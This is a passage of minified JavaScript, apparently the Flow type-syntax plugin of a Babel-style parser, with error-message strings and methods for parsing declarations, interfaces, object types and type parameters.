parameter.",SpreadVariance:"Spread properties cannot have variance.",ThisParamAnnotationRequired:"A type annotation is required for the `this` parameter.",ThisParamBannedInConstructor:"Constructors cannot have a `this` parameter; constructors don't bind `this` like other functions.",ThisParamMayNotBeOptional:"The `this` parameter cannot be optional.",ThisParamMustBeFirst:"The `this` parameter must be the first function parameter.",ThisParamNoDefault:"The `this` parameter may not have a default value.",TypeBeforeInitializer:"Type annotations must come before default assignments, e.g. instead of `age = 25: number` use `age: number = 25`.",TypeCastInPattern:"The type cast expression is expected to be wrapped with parenthesis.",UnexpectedExplicitInexactInObject:"Explicit inexact syntax must appear at the end of an inexact object.",UnexpectedReservedType:({reservedType:X})=>`Unexpected reserved type ${X}.`,UnexpectedReservedUnderscore:"`_` is only allowed as a type argument to call or new.",UnexpectedSpaceBetweenModuloChecks:"Spaces between `%` and `checks` are not allowed here.",UnexpectedSpreadType:"Spread operator cannot appear in class or interface definitions.",UnexpectedSubtractionOperand:'Unexpected token, expected "number" or "bigint".',UnexpectedTokenAfterTypeParameter:"Expected an arrow function after this type parameter declaration.",UnexpectedTypeParameterBeforeAsyncArrowFunction:"Type parameters must come after the async keyword, e.g. instead of `<T> async () => {}`, use `async <T>() => {}`.",UnsupportedDeclareExportKind:({unsupportedExportKind:X,suggestion:J})=>`\`declare export ${X}\` is not supported. Use \`${J}\` instead.`,UnsupportedStatementInDeclareModule:"Only declares and type imports are allowed inside declare module.",UnterminatedFlowComment:"Unterminated flow-comment."});function U_(X){return X.type==="DeclareExportAllDeclaration"||X.type==="DeclareExportDeclaration"&&(!X.declaration||X.declaration.type!=="TypeAlias"&&X.declaration.type!=="InterfaceDeclaration")}function bK(X){return X.importKind==="type"||X.importKind==="typeof"}var K_={const:"declare export var",let:"declare export var",type:"export type",interface:"export interface"};function V_(X,J){let Q=[],Y=[];for(let W=0;W<X.length;W++)(J(X[W],W,X)?Q:Y).push(X[W]);return[Q,Y]}var B_=/\*?\s*@((?:no)?flow)\b/,q_=(X)=>class J extends X{constructor(...Q){super(...Q);this.flowPragma=void 0}getScopeHandler(){return oK}shouldParseTypes(){return this.getPluginOption("flow","all")||this.flowPragma==="flow"}finishToken(Q,Y){if(Q!==134&&Q!==13&&Q!==28){if(this.flowPragma===void 0)this.flowPragma=null}super.finishToken(Q,Y)}addComment(Q){if(this.flowPragma===void 0){let Y=B_.exec(Q.value);if(!Y);else if(Y[1]==="flow")this.flowPragma="flow";else if(Y[1]==="noflow")this.flowPragma="noflow";else throw new Error("Unexpected flow pragma")}super.addComment(Q)}flowParseTypeInitialiser(Q){let Y=this.state.inType;this.state.inType=!0,this.expect(Q||14);let W=this.flowParseType();return this.state.inType=Y,W}flowParsePredicate(){let Q=this.startNode(),Y=this.state.startLoc;if(this.next(),this.expectContextual(110),this.state.lastTokStartLoc.index>Y.index+1)this.raise(l1.UnexpectedSpaceBetweenModuloChecks,Y);if(this.eat(10))return Q.value=super.parseExpression(),this.expect(11),this.finishNode(Q,"DeclaredPredicate");else return this.finishNode(Q,"InferredPredicate")}flowParseTypeAndPredicateInitialiser(){let Q=this.state.inType;this.state.inType=!0,this.expect(14);let Y=null,W=null;if(this.match(54))this.state.inType=Q,W=this.flowParsePredicate();else if(Y=this.flowParseType(),this.state.inType=Q,this.match(54))W=this.flowParsePredicate();return[Y,W]}flowParseDeclareClass(Q){return this.next(),this.flowParseInterfaceish(Q,!0),this.finishNode(Q,"DeclareClass")}flowParseDeclareFunction(Q){this.next();let Y=Q.id=this.parseIdentifier(),W=this.startNode(),z=this.startNode();if(this.match(47))W.typeParameters=this.flowParseTypeParameterDeclaration();else W.typeParameters=null;this.expect(10);let G=this.flowParseFunctionTypeParams();return W.params=G.params,W.rest=G.rest,W.this=G._this,this.expect(11),[W.returnType,Q.predicate]=this.flowParseTypeAndPredicateInitialiser(),z.typeAnnotation=this.finishNode(W,"FunctionTypeAnnotation"),Y.typeAnnotation=this.finishNode(z,"TypeAnnotation"),this.resetEndLocation(Y),this.semicolon(),this.scope.declareName(Q.id.name,2048,Q.id.loc.start),this.finishNode(Q,"DeclareFunction")}flowParseDeclare(Q,Y){if(this.match(80))return this.flowParseDeclareClass(Q);else if(this.match(68))return this.flowParseDeclareFunction(Q);else if(this.match(74))return this.flowParseDeclareVariable(Q);else if(this.eatContextual(127))if(this.match(16))return this.flowParseDeclareModuleExports(Q);else{if(Y)this.raise(l1.NestedDeclareModule,this.state.lastTokStartLoc);return this.flowParseDeclareModule(Q)}else if(this.isContextual(130))return this.flowParseDeclareTypeAlias(Q);else if(this.isContextual(131))return this.flowParseDeclareOpaqueType(Q);else if(this.isContextual(129))return this.flowParseDeclareInterface(Q);else if(this.match(82))return this.flowParseDeclareExportDeclaration(Q,Y);else this.unexpected()}flowParseDeclareVariable(Q){return this.next(),Q.id=this.flowParseTypeAnnotatableIdentifier(!0),this.scope.declareName(Q.id.name,5,Q.id.loc.start),this.semicolon(),this.finishNode(Q,"DeclareVariable")}flowParseDeclareModule(Q){if(this.scope.enter(0),this.match(134))Q.id=super.parseExprAtom();else Q.id=this.parseIdentifier();let Y=Q.body=this.startNode(),W=Y.body=[];this.expect(5);while(!this.match(8)){let H=this.startNode();if(this.match(83)){if(this.next(),!this.isContextual(130)&&!this.match(87))this.raise(l1.InvalidNonTypeImportInDeclareModule,this.state.lastTokStartLoc);super.parseImport(H)}else this.expectContextual(125,l1.UnsupportedStatementInDeclareModule),H=this.flowParseDeclare(H,!0);W.push(H)}this.scope.exit(),this.expect(8),this.finishNode(Y,"BlockStatement");let z=null,G=!1;return W.forEach((H)=>{if(U_(H)){if(z==="CommonJS")this.raise(l1.AmbiguousDeclareModuleKind,H);z="ES"}else if(H.type==="DeclareModuleExports"){if(G)this.raise(l1.DuplicateDeclareModuleExports,H);if(z==="ES")this.raise(l1.AmbiguousDeclareModuleKind,H);z="CommonJS",G=!0}}),Q.kind=z||"CommonJS",this.finishNode(Q,"DeclareModule")}flowParseDeclareExportDeclaration(Q,Y){if(this.expect(82),this.eat(65)){if(this.match(68)||this.match(80))Q.declaration=this.flowParseDeclare(this.startNode());else Q.declaration=this.flowParseType(),this.semicolon();return Q.default=!0,this.finishNode(Q,"DeclareExportDeclaration")}else{if(this.match(75)||this.isLet()||(this.isContextual(130)||this.isContextual(129))&&!Y){let W=this.state.value;throw this.raise(l1.UnsupportedDeclareExportKind,this.state.startLoc,{unsupportedExportKind:W,suggestion:K_[W]})}if(this.match(74)||this.match(68)||this.match(80)||this.isContextual(131))return Q.declaration=this.flowParseDeclare(this.startNode()),Q.default=!1,this.finishNode(Q,"DeclareExportDeclaration");else if(this.match(55)||this.match(5)||this.isContextual(129)||this.isContextual(130)||this.isContextual(131))if(Q=this.parseExport(Q,null),Q.type==="ExportNamedDeclaration")return Q.default=!1,delete Q.exportKind,this.castNodeTo(Q,"DeclareExportDeclaration");else return this.castNodeTo(Q,"DeclareExportAllDeclaration")}this.unexpected()}flowParseDeclareModuleExports(Q){return this.next(),this.expectContextual(111),Q.typeAnnotation=this.flowParseTypeAnnotation(),this.semicolon(),this.finishNode(Q,"DeclareModuleExports")}flowParseDeclareTypeAlias(Q){this.next();let Y=this.flowParseTypeAlias(Q);return this.castNodeTo(Y,"DeclareTypeAlias"),Y}flowParseDeclareOpaqueType(Q){this.next();let Y=this.flowParseOpaqueType(Q,!0);return this.castNodeTo(Y,"DeclareOpaqueType"),Y}flowParseDeclareInterface(Q){return this.next(),this.flowParseInterfaceish(Q,!1),this.finishNode(Q,"DeclareInterface")}flowParseInterfaceish(Q,Y){if(Q.id=this.flowParseRestrictedIdentifier(!Y,!0),this.scope.declareName(Q.id.name,Y?17:8201,Q.id.loc.start),this.match(47))Q.typeParameters=this.flowParseTypeParameterDeclaration();else Q.typeParameters=null;if(Q.extends=[],this.eat(81))do Q.extends.push(this.flowParseInterfaceExtends());while(!Y&&this.eat(12));if(Y){if(Q.implements=[],Q.mixins=[],this.eatContextual(117))do Q.mixins.push(this.flowParseInterfaceExtends());while(this.eat(12));if(this.eatContextual(113))do Q.implements.push(this.flowParseInterfaceExtends());while(this.eat(12))}Q.body=this.flowParseObjectType({allowStatic:Y,allowExact:!1,allowSpread:!1,allowProto:Y,allowInexact:!1})}flowParseInterfaceExtends(){let Q=this.startNode();if(Q.id=this.flowParseQualifiedTypeIdentifier(),this.match(47))Q.typeParameters=this.flowParseTypeParameterInstantiation();else Q.typeParameters=null;return this.finishNode(Q,"InterfaceExtends")}flowParseInterface(Q){return this.flowParseInterfaceish(Q,!1),this.finishNode(Q,"InterfaceDeclaration")}checkNotUnderscore(Q){if(Q==="_")this.raise(l1.UnexpectedReservedUnderscore,this.state.startLoc)}checkReservedType(Q,Y,W){if(!H_.has(Q))return;this.raise(W?l1.AssignReservedType:l1.UnexpectedReservedType,Y,{reservedType:Q})}flowParseRestrictedIdentifier(Q,Y){return this.checkReservedType(this.state.value,this.state.startLoc,Y),this.parseIdentifier(Q)}flowParseTypeAlias(Q){if(Q.id=this.flowParseRestrictedIdentifier(!1,!0),this.scope.declareName(Q.id.name,8201,Q.id.loc.start),this.match(47))Q.typeParameters=this.flowParseTypeParameterDeclaration();else Q.typeParameters=null;return Q.right=this.flowParseTypeInitialiser(29),this.semicolon(),this.finishNode(Q,"TypeAlias")}flowParseOpaqueType(Q,Y){if(this.expectContextual(130),Q.id=this.flowParseRestrictedIdentifier(!0,!0),this.scope.declareName(Q.id.name,8201,Q.id.loc.start),this.match(47))Q.typeParameters=this.flowParseTypeParameterDeclaration();else Q.typeParameters=null;if(Q.supertype=null,this.match(14))Q.supertype=this.flowParseTypeInitialiser(14);if(Q.impltype=null,!Y)Q.impltype=this.flowParseTypeInitialiser(29);return this.semicolon(),this.finishNode(Q,"OpaqueType")}flowParseTypeParameter(Q=!1){let Y=this.state.startLoc,W=this.startNode(),z=this.flowParseVariance(),G=this.flowParseTypeAnnotatableIdentifier();if(W.name=G.name,W.variance=z,W.bound=G.typeAnnotation,this.match(29))this.eat(29),W.default=this.flowParseType();else if(Q)this.raise(l1.MissingTypeParamDefault,Y);return this.finishNode(W,"TypeParameter")}flowParseTypeParameterDeclaration(){let Q=this.state.inType,Y=this.startNode();if(Y.params=[],this.state.inType=!0,this.match(47)||this.match(143))this.next();else this.unexpected();let W=!1;do{let z=this.flowParseTypeParameter(W);if(Y.params.push(z),z.default)W=!0;if(!this.match(48))this.expect(12)}while(!this.match(48));return this.expect(48),this.state.inType=Q,this.finishNode(Y,"TypeParameterDeclaration")}flowInTopLevelContext(Q){if(this.curContext()!==w0.brace){let Y=this.state.context;this.state.context=[Y[0]];try{return Q()}finally{this.state.context=Y}}else return Q()}flowParseTypeParameterInstantiationInExpression(){if(this.reScan_lt()!==47)return;return this.flowParseTypeParameterInstantiation()}flowParseTypeParameterInstantiation(){let Q=this.startNode(),Y=this.state.inType;if(this.state.inType=!0,Q.params=[],this.flowInTopLevelContext(()=>{this.expect(47);let W=this.state.noAnonFunctionType;this.state.noAnonFunctionType=!1;while(!this.match(48))if(Q.params.push(this.flowParseType()),!this.match(48))this.expect(12);this.state.noAnonFunctionType=W}),this.state.inType=Y,!this.state.inType&&this.curContext()===w0.brace)this.reScan_lt_gt();return this.expect(48),this.finishNode(Q,"TypeParameterInstantiation")}flowParseTypeParameterInstantiationCallOrNew(){if(this.reScan_lt()!==47)return;let Q=this.startNode(),Y=this.state.inType;Q.params=[],this.state.inType=!0,this.expect(47);while(!this.match(48))if(Q.params.push(this.flowParseTypeOrImplicitInstantiation()),!this.match(48))this.expect(12);return this.expect(48),this.state.inType=Y,this.finishNode(Q,"TypeParameterInstantiation")}flowParseInterfaceType(){let Q=this.startNode();if(this.expectContextual(129),Q.extends=[],this.eat(81))do Q.extends.push(this.flowParseInterfaceExtends());while(this.eat(12));return Q.body=this.flowParseObjectType({allowStatic:!1,allowExact:!1,allowSpread:!1,allowProto:!1,allowInexact:!1}),this.finishNode(Q,"InterfaceTypeAnnotation")}flowParseObjectPropertyKey(){return this.match(135)||this.match(134)?super.parseExprAtom():this.parseIdentifier(!0)}flowParseObjectTypeIndexer(Q,Y,W){if(Q.static=Y,this.lookahead().type===14)Q.id=this.flowParseObjectPropertyKey(),Q.key=this.flowParseTypeInitialiser();else Q.id=null,Q.key=this.flowParseType();return this.expect(3),Q.value=this.flowParseTypeInitialiser(),Q.variance=W,this.finishNode(Q,"ObjectTypeIndexer")}flowParseObjectTypeInternalSlot(Q,Y){if(Q.static=Y,Q.id=this.flowParseObjectPropertyKey(),this.expect(3),this.expect(3),this.match(47)||this.match(10))Q.method=!0,Q.optional=!1,Q.value=this.flowParseObjectTypeMethodish(this.startNodeAt(Q.loc.start));else{if(Q.method=!1,this.eat(17))Q.optional=!0;Q.value=this.flowParseTypeInitialiser()}return this.finishNode(Q,"ObjectTypeInternalSlot")}flowParseObjectTypeMethodish(Q){if(Q.params=[],Q.rest=null,Q.typeParameters=null,Q.this=null,this.match(47))Q.typeParameters=this.flowParseTypeParameterDeclaration();if(this.expect(10),this.match(78)){if(Q.this=this.flowParseFunctionTypeParam(!0),Q.this.name=null,!this.match(11))this.expect(12)}while(!this.match(11)&&!this.match(21))if(Q.params.push(this.flowParseFunctionTypeParam(!1)),!this.match(11))this.expect(12);if(this.eat(21))Q.rest=this.flowParseFunctionTypeParam(!1);return this.expect(11),Q.returnType=this.flowParseTypeInitialiser(),this.finishNode(Q,"FunctionTypeAnnotation")}flowParseObjectTypeCallProperty(Q,Y){let W=this.startNode();return Q.static=Y,Q.value=this.flowParseObjectTypeMethodish(W),this.finishNode(Q,"ObjectTypeCallProperty")}flowParseObjectType({allowStatic:Q,allowExact:Y,allowSpread:W,allowProto:z,allowInexact:G}){let H=this.state.inType;this.state.inType=!0;let U=this.startNode();U.callProperties=[],U.properties=[],U.indexers=[],U.internalSlots=[];let K,V,B=!1;if(Y&&this.match(6))this.expect(6),K=9,V=!0;else this.expect(5),K=8,V=!1;U.exact=V;while(!this.match(K)){let M=!1,F=null,j=null,O=this.startNode();if(z&&this.isContextual(118)){let A=this.lookahead();if(A.type!==14&&A.type!==17)this.next(),F=this.state.startLoc,Q=!1}if(Q&&this.isContextual(106)){let A=this.lookahead();if(A.type!==14&&A.type!==17)this.next(),M=!0}let N=this.flowParseVariance();if(this.eat(0)){if(F!=null)this.unexpected(F);if(this.eat(0)){if(N)this.unexpected(N.loc.start);U.internalSlots.push(this.flowParseObjectTypeInternalSlot(O,M))}else U.indexers.push(this.flowParseObjectTypeIndexer(O,M,N))}else if(this.match(10)||this.match(47)){if(F!=null)this.unexpected(F);if(N)this.unexpected(N.loc.start);U.callProperties.push(this.flowParseObjectTypeCallProperty(O,M))}else{let A="init";if(this.isContextual(99)||this.isContextual(104)){let S=this.lookahead();if(lK(S.type))A=this.state.value,this.next()}let D=this.flowParseObjectTypeProperty(O,M,F,N,A,W,G!=null?G:!V);if(D===null)B=!0,j=this.state.lastTokStartLoc;else U.properties.push(D)}if(this.flowObjectTypeSemicolon(),j&&!this.match(8)&&!this.match(9))this.raise(l1.UnexpectedExplicitInexactInObject,j)}if(this.expect(K),W)U.inexact=B;let Z=this.finishNode(U,"ObjectTypeAnnotation");return this.state.inType=H,Z}flowParseObjectTypeProperty(Q,Y,W,z,G,H,U){if(this.eat(21)){if(this.match(12)||this.match(13)||this.match(8)||this.match(9)){if(!H)this.raise(l1.InexactInsideNonObject,this.state.lastTokStartLoc);else if(!U)this.raise(l1.InexactInsideExact,this.state.lastTokStartLoc);if(z)this.raise(l1.InexactVariance,z);return null}if(!H)this.raise(l1.UnexpectedSpreadType,this.state.lastTokStartLoc);if(W!=null)this.unexpected(W);if(z)this.raise(l1.SpreadVariance,z);return Q.argument=this.flowParseType(),this.finishNode(Q,"ObjectTypeSpreadProperty")}else{Q.key=this.flowParseObjectPropertyKey(),Q.static=Y,Q.proto=W!=null,Q.kind=G;let K=!1;if(this.match(47)||this.match(10)){if(Q.method=!0,W!=null)this.unexpected(W);if(z)this.unexpected(z.loc.start);if(Q.value=this.flowParseObjectTypeMethodish(this.startNodeAt(Q.loc.start)),G==="get"||G==="set")this.flowCheckGetterSetterParams(Q);if(!H&&Q.key.name==="constructor"&&Q.value.this)this.raise(l1.ThisParamBannedInConstructor,Q.value.this)}else{if(G!=="init")this.unexpected();if(Q.method=!1,this.eat(17))K=!0;Q.value=this.flowParseTypeInitialiser(),Q.variance=z}return Q.optional=K,this.finishNode(Q,"ObjectTypeProperty")}}flowCheckGetterSetterParams(Q){let Y=Q.kind==="get"?0:1,W=Q.value.params.length+(Q.value.rest?1:0);if(Q.value.this)this.raise(Q.kind==="get"?l1.GetterMayNotHaveThisParam:l1.SetterMayNotHaveThisParam,Q.value.this);if(W!==Y)this.raise(Q.kind==="get"?b.BadGetterArity:b.BadSetterArity,Q);if(Q.kind==="set"&&Q.value.rest)this.raise(b.BadSetterRestParameter,Q)}flowObjectTypeSemicolon(){if(!this.eat(13)&&!this.eat(12)&&!this.match(8)&&!this.match(9))this.unexpected()}flowParseQualifiedTypeIdentifier(Q,Y){Q!=null||(Q=this.state.startLoc);let W=Y||this.flowParseRestrictedIdentifier(!0);while(this.eat(16)){let z=this.startNodeAt(Q);z.qualification=W,z.id=this.flowParseRestrictedIdentifier(!0),W=this.finishNode(z,"QualifiedTypeIdentifier")}return W}flowParseGenericType(Q,Y){let W=this.startNodeAt(Q);if(W.typeParameters=null,W.id=this.flowParseQualifiedTypeIdentifier(Q,Y),this.match(47))W.typeParameters=this.flowParseTypeParameterInstantiation();return this.finishNode(W,"GenericTypeAnnotation")}flowParseTypeofType(){let Q=this.startNode();return this.expect(87),Q.argument=this.flowParsePrimaryType(),this.finishNode(Q,"TypeofTypeAnnotation")}flowParseTupleType(){let Q=this.startNode();Q.types=[],this.expect(0);while(this.state.pos<this.length&&!this.match(3)){if(Q.types.push(this.flowParseType()),this.match(3))break;this.expect(12)}return this.expect(3),this.finishNode(Q,"TupleTypeAnnotation")}flowParseFunctionTypeParam(Q){let Y=null,W=!1,z=null,G=this.startNode(),H=this.lookahead(),U=this.state.type===78;if(H.type===14||H.type===17){if(U&&!Q)this.raise(l1.ThisParamMustBeFirst,G);if(Y=this.parseIdentifier(U),this.eat(17)){if(W=!0,U)this.raise(l1.ThisParamMayNotBeOptional,G)}z=this.flowParseTypeInitialiser()}else z=this.flowParseType();return G.name=Y,G.optional=W,G.typeAnnotation=z,this.finishNode(G,"FunctionTypeParam")}reinterpretTypeAsFunctionTypeParam(Q){let Y=this.startNodeAt(Q.loc.start);return Y.name=null,Y.optional=!1,Y.typeAnnotation=Q,this.finishNode(Y,"FunctionTypeParam")}flowParseFunctionTypeParams(Q=[]){let Y=null,W=null;if(this.match(78)){if(W=this.flowParseFunctionTypeParam(!0),W.name=null,!this.match(11))this.expect(12)}while(!this.match(11)&&!this.match(21))if(Q.push(this.flowParseFunctionTypeParam(!1)),!this.match(11))this.expect(12);if(this.eat(21))Y=this.flowParseFunctionTypeParam(!1);return{params:Q,rest:Y,_this:W}}flowIdentToTypeAnnotation(Q,Y,W){switch(W.name){case"any":return this.finishNode(Y,"AnyTypeAnnotation");case"bool":case"boolean":return this.finishNode(Y,"BooleanTypeAnnotation");case"mixed":return this.finishNode(Y,"MixedTypeAnnotation");case"empty":return this.finishNode(Y,"EmptyTypeAnnotation");case"number":return this.finishNode(Y,"NumberTypeAnnotation");case"string":return this.finishNode(Y,"StringTypeAnnotation");case"symbol":return this.finishNode(Y,"SymbolTypeAnnotation");default:return this.checkNotUnderscore(W.name),this.flowParseGenericType(Q,W)}}flowParsePrimaryType(){let Q=this.state.startLoc,Y=this.startNode(),W,z,G=!1,H=this.state.noAnonFunctionType;switch(this.state.type){case 5:return this.flowParseObjectType({allowStatic:!1,allowExact:!1,allowSpread:!0,allowProto:!1,allowInexact:!0});case 6:return this.flowParseObjectType({allowStatic:!1,allowExact:!0,allowSpread:!0,allowProto:!1,allowInexact:!1});case 0:return this.state.noAnonFunctionType=!1,z=this.flowParseTupleType(),this.state.noAnonFunctionType=H,z;case 47:{let U=this.startNode();return U.typeParameters=this.flowParseTypeParameterDeclaration(),this.expect(10),W=this.flowParseFunctionTypeParams(),U.params=W.params,U.rest=W.rest,U.this=W._this,this.expect(11),this.expect(19),U.returnType=this.flowParseType(),this.finishNode(U,"FunctionTypeAnnotation")}case 10:{let U=this.startNode();if(this.next(),!this.match(11)&&!this.match(21))if(C0(this.state.type)||this.match(78)){let K=this.lookahead().type;G=K!==17&&K!==14}else G=!0;if(G)if(this.state.noAnonFunctionType=!1,z=this.flowParseType(),this.state.noAnonFunctionType=H,this.state.noAnonFunctionType||!(this.match(12)||this.match(11)&&this.lookahead().type===19))return this.expect(11),z;else this.eat(12);if(z)W=this.flowParseFunctionTypeParams([this.reinterpretTypeAsFunctionTypeParam(z)]);else W=this.flowParseFunctionTypeParams();return U.params=W.params,U.rest=W.rest,U.this=W._this,this.expect(11),this.expect(19),U.returnType=this.flowParseType(),U.typeParameters=null,this.finishNode(U,"FunctionTypeAnnotation")}case 134:return this.parseLiteral(this.state.value,"StringLiteralTypeAnnotation");case 85:case 86:return Y.value=this.match(85),this.next(),this.finishNode(Y,"BooleanLiteralTypeAnnotation");case 53:if(this.state.value==="-"){if(this.next(),this.match(135))return this.parseLiteralAtNode(-this.state.value,"NumberLiteralTypeAnnotation",Y);if(this.match(136))return this.parseLiteralAtNode(-this.state.value,"BigIntLiteralTypeAnnotation",Y);throw this.raise(l1.UnexpectedSubtractionOperand,this.state.startLoc)}this.unexpected();return;case 135:return this.parseLiteral(this.state.value,"NumberLiteralTypeAnnotation");case 136:return this.parseLiteral(this.state.value,"BigIntLiteralTypeAnnotation");case 88:return this.next(),this.finishNode(Y,"VoidTypeAnnotation");case 84:return this.next(),this.finishNode(Y,"NullLiteralTypeAnnotation");case 78:return this.next(),this.finishNode(Y,"ThisTypeAnnotation");case 55:return this.next(),this.finishNode(Y,"ExistsTypeAnnotation");case 87:return this.flowParseTypeofType();default:if(JW(this.state.type)){let U=r6(this.state.type);return this.next(),super.createIdentifier(Y,U)}else if(C0(this.state.type)){if(this.isContextual(129))return this.flowParseInterfaceType();return this.flowIdentToTypeAnnotation(Q,Y,this.parseIdentifier())}}this.unexpected()}flowParsePostfixType(){let Q=this.state.startLoc,Y=this.flowParsePrimaryType(),W=!1;while((this.match(0)||this.match(18))&&!this.canInsertSemicolon()){let z=this.startNodeAt(Q),G=this.eat(18);if(W=W||G,this.expect(0),!G&&this.match(3))z.elementType=Y,this.next(),Y=this.finishNode(z,"ArrayTypeAnnotation");else if(z.objectType=Y,z.indexType=this.flowParseType(),this.expect(3),W)z.optional=G,Y=this.finishNode(z,"OptionalIndexedAccessType");else Y=this.finishNode(z,"IndexedAccessType")}return Y}flowParsePrefixType(){let Q=this.startNode();if(this.eat(17))return Q.typeAnnotation=this.flowParsePrefixType(),this.finishNode(Q,"NullableTypeAnnotation");else return this.flowParsePostfixType()}flowParseAnonFunctionWithoutParens(){let Q=this.flowParsePrefixType();if(!this.state.noAnonFunctionType&&this.eat(19)){let Y=this.startNodeAt(Q.loc.start);return Y.params=[this.reinterpretTypeAsFunctionTypeParam(Q)],Y.rest=null,Y.this=null,Y.returnType=this.flowParseType(),Y.typeParameters=null,this.finishNode(Y,"FunctionTypeAnnotation")}return Q}flowParseIntersectionType(){let Q=this.startNode();this.eat(45);let Y=this.flowParseAnonFunctionWithoutParens();Q.types=[Y];while(this.eat(45))Q.types.push(this.flowParseAnonFunctionWithoutParens());return Q.types.length===1?Y:this.finishNode(Q,"IntersectionTypeAnnotation")}flowParseUnionType(){let Q=this.startNode();this.eat(43);let Y=this.flowParseIntersectionType();Q.types=[Y];while(this.eat(43))Q.types.push(this.flowParseIntersectionType());return Q.types.length===1?Y:this.finishNode(Q,"UnionTypeAnnotation")}flowParseType(){let Q=this.state.inType;this.state.inType=!0;let Y=this.flowParseUnionType();return this.state.inType=Q,Y}flowParseTypeOrImplicitInstantiation(){if(this.state.type===132&&this.state.value==="_"){let Q=this.state.startLoc,Y=this.parseIdentifier();return this.flowParseGenericType(Q,Y)}else return this.flowParseType()}flowParseTypeAnnotation(){let Q=this.startNode();return Q.typeAnnotation=this.flowParseTypeInitialiser(),this.finishNode(Q,"TypeAnnotation")}flowParseTypeAnnotatableIdentifier(Q){let Y=Q?this.parseIdentifier():this.flowParseRestrictedIdentifier();if(this.match(14))Y.typeAnnotation=this.flowParseTypeAnnotation(),this.resetEndLocation(Y);return Y}typeCastToParameter(Q){return Q.expression.typeAnnotation=Q.typeAnnotation,this.resetEndLocation(Q.expression,Q.typeAnnotation.loc.end),Q.expression}flowParseVariance(){let Q=null;if(this.match(53)){if(Q=this.startNode(),this.state.value==="+")Q.kind="plus";else Q.kind="minus";return this.next(),this.finishNode(Q,"Variance")}return Q}parseFunctionBody(Q,Y,W=!1){if(Y){this.forwardNoArrowParamsConversionAt(Q,()=>super.parseFunctionBody(Q,!0,W));return}super.parseFunctionBody(Q,!1,W)}parseFunctionBodyAndFinish(Q,Y,W=!1){if(this.match(14)){let z=this.startNode();[z.typeAnnotation,Q.predicate]=this.flowParseTypeAndPredicateInitialiser(),Q.returnType=z.typeAnnotation?this.finishNode(z,"TypeAnnotation"):null}return super.parseFunctionBodyAndFinish(Q,Y,W)}parseStatementLike(Q){if(this.state.strict&&this.isContextual(129)){let W=this.lookahead();if(I8(W.type)){let z=this.startNode();return this.next(),this.flowParseInterface(z)}}else if(this.isContextual(126)){let W=this.startNode();return this.next(),this.flowParseEnumDeclaration(W)}let Y=super.parseStatementLike(Q);if(this.flowPragma===void 0&&!this.isValidDirective(Y))this.flowPragma=null;return Y}parseExpressionStatement(Q,Y,W){if(Y.type==="Identifier"){if(Y.name==="declare"){if(this.match(80)||C0(this.state.type)||this.match(68)||this.match(74)||this.match(82))return this.flowParseDeclare(Q)}else if(C0(this.state.type)){if(Y.name==="interface")return this.flowParseInterface(Q);else if(Y.name==="type")return this.flowParseTypeAlias(Q);else if(Y.name==="opaque")return this.flowParseOpaqueType(Q,!1)}}return super.parseExpressionStatement(Q,Y,W)}shouldParseExportDeclaration(){let{type:Q}=this.state;if(Q===126||kK(Q))return!this.state.containsEsc;return super.shouldParseExportDeclaration()}isExportDefaultSpecifier(){let{type:Q}=this.state;if(Q===126||kK(Q))return this.state.containsEsc;return super.isExportDefaultSpecifier()}parseExportDefaultExpression(){if(this.isContextual(126)){let Q=this.startNode();return this.next(),this.flowParseEnumDeclaration(Q)}return super.parseExportDefaultExpression()}parseConditional(Q,Y,W){if(!this.match(17))return Q;if(this.state.maybeInArrowParameters){let Z=this.lookaheadCharCode();if(Z===44||Z===61||Z===58||Z===41)return this.setOptionalParametersError(W),Q}this.expect(17);let z=this.state.clone(),G=this.state.noArrowAt,H=this.startNodeAt(Y),{consequent:U,failed:K}=this.tryParseConditionalConsequent(),[V,B]=this.getArrowLikeExpressions(U);if(K||B.length>0){let Z=[...G];if(B.length>0){this.state=z,this.state.noArrowAt=Z;for(let M=0;M<B.length;M++)Z.push(B[M].start);({consequent:U,failed:K}=this.tryParseConditionalConsequent()),[V,B]=this.getArrowLikeExpressions(U)}if(K&&V.length>1)this.raise(l1.AmbiguousConditionalArrow,z.startLoc);if(K&&V.length===1)this.state=z,Z.push(V[0].start),this.state.noArrowAt=Z,{consequent:U,failed:K}=this.tryParseConditionalConsequent()}return this.getArrowLikeExpressions(U,!0),this.state.noArrowAt=G,this.expect(14),H.test=Q,H.consequent=U,H.alternate=this.forwardNoArrowParamsConversionAt(H,()=>this.parseMaybeAssign(void 0,void 0)),this.finishNode(H,"ConditionalExpression")}tryParseConditionalConsequent(){this.state.noArrowParamsConversionAt.push(this.state.start);let Q=this.parseMaybeAssignAllowIn(),Y=!this.match(14);return this.state.noArrowParamsConversionAt.pop(),{consequent:Q,failed:Y}}getArrowLikeExpressions(Q,Y){let W=[Q],z=[];while(W.length!==0){let G=W.pop();if(G.type==="ArrowFunctionExpression"&&G.body.type!=="BlockStatement"){if(G.typeParameters||!G.returnType)this.finishArrowValidation(G);else z.push(G);W.push(G.body)}else if(G.type==="ConditionalExpression")W.push(G.consequent),W.push(G.alternate)}if(Y)return z.forEach((G)=>this.finishArrowValidation(G)),[z,[]];return V_(z,(G)=>G.params.every((H)=>this.isAssignable(H,!0)))}finishArrowValidation(Q){var Y;this.toAssignableList(Q.params,(Y=Q.extra)==null?void 0:Y.trailingCommaLoc,!1),this.scope.enter(518),super.checkParams(Q,!1,!0),this.scope.exit()}forwardNoArrowParamsConversionAt(Q,Y){let W;if(this.state.noArrowParamsConversionAt.includes(this.offsetToSourcePos(Q.start)))this.state.noArrowParamsConversionAt.push(this.state.start),W=Y(),this.state.noArrowParamsConversionAt.pop();else W=Y();return W}parseParenItem(Q,Y){let W=super.parseParenItem(Q,Y);if(this.eat(17))W.optional=!0,this.resetEndLocation(Q);if(this.match(14)){let z=this.startNodeAt(Y);return z.expression=W,z.typeAnnotation=this.flowParseTypeAnnotation(),this.finishNode(z,"TypeCastExpression")}return W}assertModuleNodeAllowed(Q){if(Q.type==="ImportDeclaration"&&(Q.importKind==="type"||Q.importKind==="typeof")||Q.type==="ExportNamedDeclaration"&&Q.exportKind==="type"||Q.type==="ExportAllDeclaration"&&Q.exportKind==="type")return;super.assertModuleNodeAllowed(Q)}parseExportDeclaration(Q){if(this.isContextual(130)){Q.exportKind="type";let Y=this.startNode();if(this.next(),this.match(5))return Q.specifiers=this.parseExportSpecifiers(!0),super.parseExportFrom(Q),null;else return this.flowParseTypeAlias(Y)}else if(this.isContextual(131)){Q.exportKind="type";let Y=this.startNode();return this.next(),this.flowParseOpaqueType(Y,!1)}else if(this.isContextual(129)){Q.exportKind="type";let Y=this.startNode();return 